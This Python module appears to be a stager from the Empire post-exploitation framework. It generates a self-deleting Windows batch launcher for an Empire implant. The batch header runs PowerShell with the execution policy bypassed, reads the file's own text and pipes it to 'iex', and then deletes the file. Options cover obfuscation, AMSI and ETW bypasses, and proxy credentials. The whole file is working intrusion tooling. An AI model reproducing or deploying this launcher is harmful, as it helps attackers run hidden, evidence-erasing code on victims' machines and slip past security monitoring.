from __future__ import print_function
from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BAT Launcher',

            'Author': ['@harmj0y'],

            'Description': 'Generates a self-deleting .bat launcher for Empire.',

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output, otherwise returned as a string.',
                'Required': False,
                'Value': 'launcher.bat'
            },
            'Delete': {
                'Description': 'Switch. Delete .bat after running.',
                'Required': False,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        delete = self.options['Delete']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        bypasses = self.options['Bypasses']['Value']

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        # generate the launcher code including escapes for % characters needed for .bat files
        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language, encode=True,
                                                           obfuscate=obfuscate_script,
                                                           obfuscationCommand=obfuscate_command, userAgent=user_agent,
                                                           proxy=proxy, proxyCreds=proxy_creds,
                                                           stagerRetries=stager_retries, bypasses=bypasses).replace("%",
                                                                                                                   "%%")

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            # The start to the batch eliminates the batch file command limit. It was taken from here:
            # https://www.reddit.com/r/PowerShell/comments/gaa2ip/never_write_a_batch_wrapper_again/

            if delete.lower() == "true":
                # code that causes the .bat to delete itself
                code = '# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & DEL \"%~f0\" & POPD /B\n'
            else:
                code = '# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText(\'%~f0\')|iex" & POPD /B\n'
            code += launcher + "\n"

            return code
